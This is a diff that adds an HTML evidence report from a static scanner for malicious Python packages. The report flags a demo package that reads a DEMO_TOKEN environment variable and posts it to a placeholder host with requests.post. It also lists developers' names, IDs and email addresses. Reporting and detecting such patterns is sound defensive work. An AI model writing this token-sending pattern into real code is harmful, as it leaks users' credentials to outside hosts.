@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>PyPi-AI Security Report</title>
+  <style>
+    body { font-family: Arial, sans-serif; color: #111; background: #fff; margin: 32px; }
+    h1, h2 { color: #000; }
+    table { border-collapse: collapse; width: 100%; }
+    th, td { border: 1px solid #333; padding: 8px; vertical-align: top; }
+    th { background: #f1f1f1; }
+    code { white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h1>PyPi-AI Evidence Report</h1>
+  <p>Static-only scanner; never executes untrusted package code.</p>
+  <h2>Developers</h2><ul><li>VASANTH ADITHYA - 160123749049 - vasanthfeb13@gmail.com</li><li>SAI GEETHIKA - 160123749302 - yedlasaigeethika37@gmail.com</li></ul>
+  <h2>Summary</h2>
+  <p>Target: examples/safe_packages/env_network<br>
+  Risk: 45/100 (medium)<br>
+  Findings: 3</p>
+  <h2>Evidence</h2>
+  <table><thead><tr><th>ID</th><th>Rule</th><th>Severity</th><th>Location</th><th>Snippet</th></tr></thead>
+  <tbody><tr><td>F001</td><td>PY001_ENV_ACCESS</td><td>medium</td><td>env_network_demo/__init__.py:7</td><td><code>token = os.environ.get(&quot;DEMO_TOKEN&quot;)</code></td></tr><tr><td>F002</td><td>PY001_ENV_ACCESS</td><td>medium</td><td>env_network_demo/__init__.py:12</td><td><code>token = os.environ.get(&quot;DEMO_TOKEN&quot;)</code></td></tr><tr><td>F003</td><td>PY003_NETWORK_CLIENT</td><td>medium</td><td>env_network_demo/__init__.py:13</td><td><code>requests.post(&quot;https://example.invalid/demo&quot;, data={&quot;token&quot;: token})</code></td></tr></tbody></table>
+  <h2>Evidence-Grounded Explanation</h2><ul><li>Environment variable access was detected. Category: credential-access; severity: medium; file: env_network_demo/__init__.py:7. [F001]</li><li>Environment variable access was detected. Category: credential-access; severity: medium; file: env_network_demo/__init__.py:12. [F002]</li><li>Network client behavior was detected. Category: network; severity: medium; file: env_network_demo/__init__.py:13. [F003]</li></ul>
+  <h2>Limitations</h2><ul><li>Static analysis can miss behavior generated at runtime.</li><li>The scanner never executes package code, so it cannot observe live network or process behavior.</li><li>AI explanations are summaries of evidence and are not independent proof.</li></ul>
+  <h2>Citations</h2><ul><li><strong>CHASE</strong>: Toda, T. and Mori, T. CHASE: LLM Agents for Dissecting Malicious PyPI Packages. 2025 IEEE/ACM AIware.</li><li><strong>PYPA_SDIST</strong>: PyPA source distribution format specification.</li><li><strong>PYPA_WHEEL</strong>: PyPA binary distribution wheel format specification.</li><li><strong>PYTHON_TARFILE</strong>: Python tarfile extraction filters documentation.</li><li><strong>GEMINI</strong>: Google Gemini API structured output documentation.</li><li><strong>OLLAMA</strong>: Ollama API and cloud documentation.</li><li><strong>OSV</strong>: OSV.dev public vulnerability database and API for open-source packages.</li><li><strong>MALWARE_EXAMPLES</strong>: Public reports and datasets from Datadog, Unit42, Fortinet, and ReversingLabs for package-name examples only.</li></ul>
+</body>
+</html>
